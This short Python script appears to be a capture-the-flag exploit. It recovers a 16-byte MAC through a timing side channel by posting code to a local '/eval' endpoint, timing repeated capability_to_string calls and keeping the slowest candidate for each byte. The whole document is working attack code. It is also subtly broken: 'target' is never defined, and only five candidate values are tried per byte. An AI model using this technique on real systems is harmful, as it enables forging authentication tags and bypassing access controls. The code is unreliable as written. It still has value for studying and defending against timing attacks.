import sys
import requests

if len(sys.argv) != 2:
    sys.stderr.write("usage: {} [target]\n".format(sys.argv[0]))
    sys.exit(1)

def attempt(xs):
    r = requests.post("http://127.0.0.1:3000/eval", data="""
import capability

class MyCapability(object):
    def __init__(self):
        self.target = "{}"
        self.mac = {}

c = MyCapability()
for _ in range(50000):
    capability.capability_to_string(c)
""".format(target, xs))
    js = r.json()
    # print(xs[0], js)
    return js['time']

mac = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

for i in range(16):
    best = -1
    best_char = 0
    for c in [1, 2, 103, 3, 4]:
        attempts = []
        mac[i] = c
        for _ in range(5):
            attempts.append(attempt(mac))
        time = sum(attempts) / 5
        print("{}: {}".format(c, time))
        if time > best:
            best = time
            best_char = c
    mac[i] = best_char
print(mac)
